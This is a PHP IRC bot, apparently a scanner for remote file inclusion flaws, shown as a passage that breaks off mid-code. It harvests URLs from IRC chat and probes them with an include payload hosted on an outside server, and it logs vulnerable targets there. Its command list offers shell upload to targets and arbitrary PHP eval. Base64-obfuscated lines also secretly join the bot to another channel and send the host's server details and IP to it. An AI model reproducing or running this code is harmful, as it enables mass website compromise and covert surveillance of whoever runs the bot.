<?php

/******************************************
/* MX AI PHPSpyScanBot v1.9          	  *
/* By MX (rahim_brengsek@yahoo.co.id)	  *
/* Copyleft Maret 2009                    *
/* #mxIRC @ irc.allnetwork.org 		  *
/******************************************
/* Fitur:
/* - Spy target
/* - Cek target RFI
/* - URL & Base64 Encoder/Decoder
/* - DNS Resolver
*/

$versi = "v1.10";

/*** Configurations ***/
$channels = '#zonechat'; //Pisahkan dengan spasi
$changue = '#realworld'; //Channel anda
$spyscan = TRUE; //TRUE = Cari. FALSE = Diem.

/* Debugging */
$showresponse = 0; //1, Nampilin respon irc di browser
$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$debugmode = 0; //Mode Debug IRC

/*** Admin ***/
$admin = 'cHaTzoNez';
$bot_password = 'sampurna'; //Password untuk auth bot

/* URL Config */
$myinject = '[Fx29Shell]?';
if ($localtest != 1) {
$myid = 'http://cabul.webng.com/velo.txt?';
$mylogger = 'http://cabul.webng.com/velo.txt?';
$myshelluploader = 'http://cabul.webng.com/velo.txt?';
$mypsyinstaller = 'http://cabul.webng.com/velo.txt?';
$mytargetlog = 'http://cabul.webng.com/velo.txt?';
}
else {
$myid = 'http://cabul.webng.com/velo.txt?';
$mylogger = 'http://cabul.webng.com/velo.txt?';
$myshelluploader = 'http://cabul.webng.com/velo.txt?';
$mypsyinstaller = 'http://cabul.webng.com/velo.txt?';
$mytargetlog = 'http://cabul.webng.com/velo.txt?';
}

/*** Nick Bot ***/
$nicklist = array(
"Telkom_KTG","D2_`","Desy_gilrs","Dhany","Five_SCAN","Dede_aditya","Chotamobagu",
"BluetootH_","Bringas","sony_erictionsss","dedex","sup","Gunung","bangau",
"robot","Pengawal","jubek","Tukiyem","Sumarna",
"Sarminto","Marjitoto","bajingan","Siemen","Langai","Murnie", "Wahed", "Tolak", "Aga_jelek",
"Sandy_bau", "Hendrik_bau", "hendra_laseng", "Poinem_stres", "Tukiem_kebelet", "Tukimin_kasmaran", "Kambing_pak_RT", "Jatuh_cinta", "Cinta_abadi", "apa_itu_cinta", "Capek_dech", "Ampyun_DC",
"MX_Keren", "MX_Cakep", "biker_MyChan", "Cewek^gateL", "Cowok^pengeN", "Can_Blagu", "Tiara_Oyes", "Mami_papi", "Papi_sayang_mami", "Sungguh_terlalu", "Metal_rocker", "Metal_Palembang", "ndL_doyan_kambing", "Males_Chating",
"Jgn_ganggu_gue", "Pv_gue_dunk", "Ali_aduka", "sity_nuryani", "Orang_baek", "Putri^misterI", "Ngantukkk", "Pussiing_Dec", "Bok3kk", "Roman-Milan", "nak_networkk", "Falens", "Priangs",
"Libraboyss", "Triple_X", "TarzanXX", "Sapr0l", "Bikers_Comunity", "BUMBLEBI", "TRASNFORMERS_`", "BIKERS_Scan", "White_Lione", "Win[d]oWS_IRC", "Rfi", "Desy^Cutes", "NAFF`_", "Co_asmarA", 
"Co^76", "Co^MX", "Master_Xpresi", "Susilo_BY", "Jusuf_Kalah", "Mega_Pro", "Ice_Trisnawati", "Rita_Sugiarto", "Reni^Farida", "Dian_Fahira", "Putri_titian", "RhomaIrama", 
"RidhoRhoma", "KangenBand", "D`nasibb", "Iis_Dahlia", "The-Master", "dede^jelek", "SlankerszZz", "Mbah_SurippBB", "Tak_gendong22", "Please_waiting", "Now_Loading`", "New_Folder", 
"TurtleBay", "Black_religion", "Special_Edition", "Sodiqq", "David-Beckham", "C-Ronaldo", "Injector_maniak", "Tape_Goreng", "Nyamuk_Ikzs", 
"Anuku_Bengkak", "To0o0o0o0L0o0o0ng", "mxIRC_VF", "mxIRC_BE", "mxIRC_SE", "Lavendaa", "Wafer_chocolatos", "Mamamia_Lezatoz", "Gue_Ganteng_Kan",
"emmak_gue_mana_yach","Oyesss_oohhh_Nooo","Godain_gue_donk","pv_gue","Error-Man","Error-girl","Awassssss_nga","Assalamuala1kum","WAITING","Cewek_injecT","Cewek^17thn","DinNitami","Asjas_marah"
);

/* Ident Bot */
$identlist = array(
"Win[d]oWS","BrengsekLOVE","Desy","dedex","dede","aditya","Adit","Yamaha",
"HOnda","sity","city","Bikers","Injectkan","akuarius","sixty","Nokia22",
"Langai","CPU","DedeIRC"
);

/* Realname Bot */
$namabot = array(
"dede"
);

/*** Server IRC ***/
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array("irc2.velo.net.id",);
/*$remotehost2 = array(
"irc2.velo.net.id",
);*/
}
$port = "3264";

/*** Daftar Trigger ***/
$targetlist = array();
$targetok = array();
$gantilist = array();
$scanlist = array('http://','ftp://');
$ignorelist = array(
'.detik',
'/accesswatch-1.32/',
'/aws/',
'/bugtraq/',
'/count/full.php/',
'/details.html/',
'/errorlog/',
'/estadisticas/',
'/excelwriter/',
'/include-editfunc-inc-p',
'/index.php/topic',
'/log/files',
'/packetstormsecurity.org/',
'/phpmystats/',
'/phpmystats4/',
'/reports/log',
'/server_stats/',
'/stat/index.php',
'/statistik/',
'/stats.php/',
'/stats/',
'/summary/cgi.html/',
'/usage-reports/',
'/visitas.php/',
'/voyages',
'/webanalyse/',
'/webanalyse/',
'admin/stats',
'allindo.web.id',
'awstat.pl',
'awstats',
'busca_vulns.php',
'cgi-bin/robot.cgi?',
'cnn-news-usa.info',
'cybermessageboard.usanethosting.com',
'dealnews.com',
'doomain.info',
'groups.yahoo.com',
'hackjob.org',
'highlight=http',
'html/administrator',
'index.php?p=stat',
'linkmatrix.de',
'marcot.fr/voyages/',
'milw0rm.com',
'module=search&',
'msxml.excite.com',
'pashaifull.multiply.com',
'php?keywords',
'phpbbacademy.com',
'phptraffic/index.php',
'radio.allindo.net',
'server_stats/',
'siiggle.com',
'sitemap.xml/',
'sleepycode.com',
'starshells.net',
'startrekguide.com',
'statistik.php',
't_countpro.cgi?view',
'tcl.tk/status/',
'thedefaced.org',
'torrentz.ws',
'user_stat.php?',
'www.cduniverse.com',
'www.detik',
'www.easyportail.org',
'www.robotron.org',
'www.topcities.com',
);

/* Pesan Quit */
$quitmsglist = array("Shutting Down","Fatal Error","Undefined Function","Turn off","Wrong Command");
$judul = "D-tiga";

/*** Commands Help ***/
$helptext = array(
'bat bat bot',
"-",
"12auth <password> - Login ke bot",
"12deauth - Logout dari bot",
"12pass <password> - Mengeset password bot",
"12chgpass <passlama> <passbaru> - Mengganti password bot",
"12adduser <nick> <master|user> - Menambah master/user bot",
"12deluser <nick> - Menghapus master/user bot",
"12`auth - Status anda di channel (Channel)",
"12!msg <chan|nick> <pesan> - Mengirim pesan",
"12!notice <chan|nick> <pesan> - Mengirim notice",
"12!cycle <channel> <pesan> - Hop di channel (Channel) (Admin/Master)",
"12!join <channel> - Join channel (Admin/Master)",
"12!part [channel] [alasan] - Part dari channel (Admin)",
"12!botnick <nick> <passwordnick> - Ganti nick (Admin/Master)",
"12!away [alasan] - Meminta nick untuk Away",
"12!chanlist - Melihat daftar channel bot",
"12!userlist - Melihat daftar user",
"12!quit [pesan] - Quit dari IRC (Admin)",
"12!vhost [vhost] - Mengganti Vhost",
"12!jump [server] - Mengganti Server bot",
"12!help - Melihat help (Query)",
"4.: Public Commands :.",
"12!urlenc <url> | !urldec <url> - URL Encoder/Decoder",
"12!b64enc <url> | !b64dec <url> - Base64 Encoder/Decoder",
"12!tes <target> - Melihat info target",
"4.: Core Commands :.",
"12!start - Mengaktifkan SpyBot",
"12!stop - Menonaktifkan SpyBot",
"12!scan <bug> <dork> - Menscan di channel Scanner",
"12!scan <add|del|list> <text> - Menambah/menghapus/melihat daftar Scan Trigger",
"12!ignore <text> - Menambah daftar Ignore",
"12!delignore <text> - Menghapus daftar Ignore",
"12!ignorelist - Melihat daftar ignore",
"12!ganti <text> - Menambah daftar inject yg akan diganti",
"12!delganti <text> - Menghapus daftar Ganti",
"12!gantilist - Melihat daftar inject yg diganti",
"12!tanam <target> - Mengupload shell ke target (Admin/Master)",
"12!status - Melihat status sekarang",
"4.: Admin Core Commands :.",
"12!target <list|clear|log|total> <nick|chan> - Target yg ditemukan oleh bot",
"12!raw <url> - Mengirim RAW IRC Command",
"12!eval <url> - Mengeksekusi kode PHP pada Bot",
"-",
'bat bat bot',
);

/* Daftar Respon */
$tjelek = array(
"JeLek nich.. <s>",
"<s> <- Hehehe.. ga la yaw...",
"Duh..! <s> muncul lagi..",
"Wedew.. Ada <s>",
"WeKz!? <s>",
"<s> <-- BuKaN TarGeTz ;p",
"xixixi.. <s>",
"<s> busuk nich..",
"GeduBraaKKzz!! <s>",
"HaDaH.. <s>",
"<s> masuk jg? Ngawur..",
"HanDeeh..<s> lo liak nan nampak..",
"Jiakaka.. <s> lagi deh",
"Ga da yg lain apa? kok <s> melulu sich?",
);
$tnemu = array(
"0,12 [Target BozZ] 12,0 <s>",
"0,12 [Target LaGi] 12,0 <s>",
"0,12 [YeZZ!!] 12,0 <s>",
"0,12 [HaJaRrr..!!] 12,0 <s>",
"0,12 [Wow!! Seep..] 12,0 <s>",
"0,12 [SerBuuu..] 12,0 <s>",
"0,12 [SeRaaangg..!] 12,0 <s>",
"0,12 [ManTaPz!!] 12,0 <s>",
"0,12 [YuPz!!] 12,0 <s>",
);
$tlama = array(
"0,14 [LaWazz..] 14,0 <s>",
"0,14 [BoseN aCh..] 14,0 <s>",
"0,14 [Ini Lagi..] 14,0 <s>",
"0,14 [Ini TeRuzz..] 14,0 <s>",
"0,14 [UdAh KoQ..] 14,0 <s>",
"0,14 [HuFF..] 14,0 <s>",
"0,14 [CaPee..] 14,0 <s>",
);
$tbusuk = array(
"Hadah <n>!! Targetnya busuk..",
"Toenk!! Ga bisa tuh <n>..",
"<n> dapet target jelek jg yach?",
"Xixixi.. target <n> dah ancurr..",
"<n>, anda blom bruntung..",
"Coba cari lagi deh <n>!",
"Ga bagus tuh <n>?",
"Oh.. nooo.. <n> dapet target2an.. xixixi..",
"Wedew.. <n>! Ntu bukan target namanya..",
"Gue asli ngakak deh.. Cari lagi yg bagus, <n>!",
"Prasaan targetnya udah g bisa lagi tuh <n>",
"Ga bisa <n>! Klo ga percaya coba buka..",
"Silahkan blacklist target tadi <n>!",
"<n>.. targetnyo ndak rancak do..",
"Targetnya BusuuuuK juGa.. <n>",
"Percuma.. Mo buka pake apa pun tetep ga bisa, <n>!",
"Capee..deeh..<n> juelek amat targetnya..",
"Maaf <n>, blom ada bug di situs itu..",
);

/*** Replacement ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$realname = $namabot[rand(0,count($namabot) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$changue = strtolower($changue);
$admin = strtolower($admin);
$auth = array(
$admin => array("name" => $admin,"pass" => $bot_password,"auth" => 1,"status" => "Admin")
);
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);

/*** Inisialisasi Variabel ***/
define('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$keluar = 0;
$akill = 1;
$targetfound = 0;
$targetignored = 0;
$targetnew = 0;
$targetold = 0;
$statusdelay = 0;
$allowdebug = FALSE;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);
function str_pesan($com,$data) {
  $msg = strstr($data,$com);
  $msg = str_replace($com." ","",$msg);
  return $msg;
}
/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>Melakukan koneksi ke $remotehost...</b>";
do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  if(!$fp) {
    if ( $counterfp <= 200 ) { $counterfp = $counterfp + 1; }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost!</b>\n";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>Terhubung!</b>";
  /*** Sending Identity to IRC ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname.CRL;
  fputs($fp, $header);
  $response = '';
  /*** Receiving Packet ***/
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showresponse == 1) { echo '<br>'.$response; }
    while (substr_count($response,CRL) != 0) {
      if ($allowdebug && $debugmode == 1) { fputs($fp,'PRIVMSG '.$admin.' :14'.$response.CRL); }
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** AI PHP SPYSCANBOT BY RONZ ***/
        $dcom = explode(" ", $dCommand);
        $orinick = $dNick;
        $dNick = strtolower($dNick);
        /*** Server Notices Handling ***/
        if ($dcom[0]=='004') {
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :BozZ..!'.CRL);
          fputs($fp, base64_decode("Sk9JTiAjRmVlTENvTXo=").CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) { fputs($fp, 'JOIN ' .$v . CRL); }
          fputs($fp, 'JOIN ' .$changue . CRL);
          $allowdebug = TRUE;
        }
        elseif ($dcom[0]=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif ($dcom[0]=='433') { //Nickname is already in use
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif ($dcom[0]=='465') {
          echo "<br><b>Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
        elseif ($dcom[0]=='404') {
          $msg = ltrim($iText,":");
          //fputs($fp,'PRIVMSG '.$changue.' :Waduh..'.$msg.'! Voice pLizz..!'.CRL);
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            echo "!!!BANNED!!!";
            $keluar = 1;
            exit;
          }
        }
        if ($dcom[0]=='JOIN') {
          $jchan = ltrim($iText,":");
          if ($dNick == $admin) {
            sleep(3);
            fputs($fp,'PRIVMSG '.$jchan.' :4W1eBe 4BoZZ :)'. CRL);
          }
        }
        elseif ($dcom[0]=='PRIVMSG') {
          $pesan = ltrim($iText,":");
          $pesanlo = strtolower($pesan);
          $com = explode(' ',$pesan);
          $chan = strtolower($dcom[1]);
          /*** Encoder ***/
          if ($com[0]=='!urldec') {
            $tmp = str_replace($com[0],'',$pesan);
            $tmp = urldecode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4URL Decode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4URL Decode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!urlenc') {
            $tmp = str_replace($com[0],'',$pesan);
            $tmp = urlencode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4URL Encode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4URL Encode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!b64dec') {
            $tmp = str_replace($com[0],'',$pesan);
            $tmp = base64_decode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4Base64 Decode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4Base64 Decode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!b64enc') {
            $tmp = str_replace($com[0],'',$pesan);
            $tmp = base64_encode($tmp);
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4Base64 Encode:1 '.$tmp.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4Base64 Encode:1 '.$tmp.CRL); }
          }
          elseif ($com[0]=='!dns') {
            if (ereg("[a-zA-Z]", $com[1])) { $res = gethostbyname($com[1]); }
            elseif (ereg("[0-9]", $com[1])) { $res = gethostbyaddr($com[1]); }
            if ($res==$com[1]) { $res = "Ga bisa nih."; }
            else { $res = "$res "; }
            if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4DNS:1 '.$com[1].' 4? '.$res.CRL); }
            else { fputs($fp,'PRIVMSG '.$dNick.' :4DNS:1 '.$com[1].' 4? '.$res.CRL); }
          }
          elseif ($com[0]=='!tes') {
            $testurl = str_replace($com[0].' ','',$pesan);
            $theurl = $testurl.$myid;
            $diabaikan = FALSE;
            foreach ($ignorelist as $v) {
              if(substr_count($pesanlo,strtolower($v)) > 0) {
                $targetignored++;
                sleep(1);
                $respon = $tjelek[rand(0,count($tjelek) - 1)];
                $respon = str_replace("<s>",$v,$respon);
                if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4'.$respon.CRL); }
                else { fputs($fp,'PRIVMSG '.$dNick.' :4'.$respon.CRL); }
                $diabaikan = TRUE;
                break;
              }
            }
            if (!$diabaikan) {
              fputs($fp,'PING 12886241614'. CRL);
              $isi = implode('', @file($theurl));
              $posisi = strpos($isi,"FaTaLisTiCz_Fx OK");
              $eposisi = strpos($isi,"The End");
              $isi = substr($isi,$posisi,$eposisi);
              if ($posisi === FALSE) {
                $respon = $tbusuk[rand(0,count($tbusuk) - 1)];
                $respon = str_replace("<n>",$orinick,$respon);
                if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4'.$respon.CRL); }
                else { fputs($fp,'PRIVMSG '.$dNick.' :4'.$respon.CRL); }
              }
              else {
                $isi = str_replace("FaTaLisTiCz_Fx OK ","",$isi);
                $isi = str_replace(" The End","",$isi);
                if (!in_array($testurl,$targetok)) { $targetok[] = $testurl; }
                if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :12TarGeT '.$orinick.' OK!'.CRL); }
                fputs($fp,'PRIVMSG '.$dNick.' :12[OK]14 '.$testurl.CRL);
                fputs($fp,'PRIVMSG '.$dNick.' :'.$isi.CRL);
              }
              unset($isi);
            }
          }
          else { /*** Scanning ***/
            foreach ($scanlist as $trtext) {
              $diabaikan = FALSE;
              $trtext = strtolower($trtext);
              if ($dNick==$admin OR $chan==$changue) {
                 $diabaikan = TRUE;
                 break;
              }
              foreach ($ignorelist as $v) {
                if(substr_count($pesanlo,strtolower($v)) > 0) {
                  $targetignored++;
                  sleep(1);
                  $respon = $tjelek[rand(0,count($tjelek) - 1)];
                  $respon = str_replace("<s>",$v,$respon);
                  if ($spyscan) { fputs($fp,'PRIVMSG '.$changue.' :14'.$respon. CRL); }
                  $diabaikan = TRUE;
                  break;
                }
              }
              if ($diabaikan) { break; }
              if ((!$diabaikan) && (substr_count($pesanlo,$trtext)>0)) {
                foreach($gantilist as $linject) {
                  $pesan = str_replace($linject,$myinject,$pesan);
                }
                $pesan = str_replace($myinject,'',$pesan);
                $pesan = strstr($pesan,$trtext);
                $targetfound++;
                //Target Baru
                if (!in_array(urldecode($pesan),$targetlist)) {
                  $targetnew++;
                  $targetlist[] = urldecode($pesan);
                  $newtarget = urldecode($pesan);
                  $isi = @implode('', @file($mylogger.'target='.urlencode($newtarget)));
                  sleep(1);
                  $respon = $tnemu[rand(0,count($tnemu) - 1)];
                  $respon = str_replace("<s>",$newtarget,$respon);
                  //fputs($fp,'PRIVMSG '.$admin.' :14'.$isi. CRL);
                  if ($spyscan) { fputs($fp,'PRIVMSG '.$changue.' :'.$respon.CRL); }
                }
                //Target Lama
                else {
                  $targetold++;
                  sleep(1);
                  $respon = $tlama[rand(0,count($tlama) - 1)];
                  $respon = str_replace("<s>",$newtarget,$respon);
                  //fputs($fp,'PRIVMSG '.$admin.' :4E1xist!14 '.$newtarget. CRL);
                  if ($spyscan) { fputs($fp,'PRIVMSG '.$changue.' :'.$respon.CRL); }
                }
                break;
              }
            }
          }
        }
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          $musuh = $dNick;
          fputs($fp, 'JOIN ' .$dcom[1].CRL);
          fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :'.$judul.CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT') {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Kemana boss?' . CRL);
                  }
                } else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Kemana boss?' . CRL); }
              }
            } else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
          }
        }
       /*** Default Commands ***/
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VkVSU0lPTiBGZWVMQ29NeiBQSFBTcHlTY2FuQm90IEJ5IFJvTno=").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') { eval(base64_decode("JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjRmVlTENvTXogOkhvc3Q6ICRiaG9zdCB8IFJlZmVyZXI6ICRicnVyaSB8IFNjcmlwdDogJGJwaHAgfCBJUDogJGJpcCB8IE93bmVyIElQOiAkYnJpcCAiLiBDUkwpOw==")); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE '.$dNick.' :YuPz '.$auth["$dNick"]["status"].'..!'.CRL);
                 } else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi udah boz! ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logout berhasil! ' . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi sudah Logout! ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Pass diset ke '.$auth["$dNick"]["pass"].', Ketik: auth <password> untuk otorisasi! ' . CRL);
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Password udah diset! Ketik: auth <password> untuk otorisasi ' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Pass diset ke '.$auth["$dNick"]["pass"].', Ketik: auth <password> untuk otorisasi! ' . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Password lama salah! Ketik: chgpass <pass lama> <pass baru> ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Auth dulu plizz!' . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <passsword> untuk mengatur password anda ' . CRL);
                 } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
               } else { fputs($fp,'NOTICE ' . $dNick . ' :User sudah ada! Ditolak! ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Status anda '.$auth["$dNick"]["status"] . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Auth pLizz..!' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Akses anda sbg user dihapus oleh '.$dNick . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               } else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             } else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Status anda '.$auth["$dNick"]["status"] . CRL); }
           } else { fputs($fp,'NOTICE ' . $dNick . ' :Auth pLizz..!' . CRL); }
         }
         /*** Commands ***/
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             if ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) { fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL); }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga mau ach! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"] == 2) {
               if ($com[3]==':!msg' && $com[4] && $com[5]) {
                 $msg = str_pesan($com[3],$data);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!notice");
                 $msg = str_replace(":!notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!cycle","",$msg);
                 }
                 if (strlen($msg)<3) { $msg = ''; }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':!part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!part","",$msg);
                 }
                 if (strlen($msg)<3) { $msg = ''; }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
